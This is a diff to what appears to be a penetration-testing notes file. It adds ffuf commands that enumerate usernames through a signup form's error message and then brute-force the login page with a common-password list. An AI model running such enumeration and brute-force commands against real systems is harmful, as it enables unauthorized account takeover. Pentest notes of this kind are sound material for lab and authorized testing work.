@@ -197,6 +197,15 @@ ffuf -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-2
 - **`-H`**: Header values. (Use BurpSuite)
     - e.g. `-H "Content-Type: application/x-www-form-urlencoded"`
 
+#### Example, username enumeration and subsequent brute-force
+```bash
+# Enumerate usernames through error message
+ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://$IP/customers/signup -mr "username already exists"
+
+# Brute-force login credentials with previously discovered usernames
+ffuf -w users.lst:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt:W2 -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=W1&password=W2" -u http://$IP/customers/login -fr "Invalid Username/Password Combination"
+```
+
 ## Mail
 ### POP3
 #### Connecting and authentication
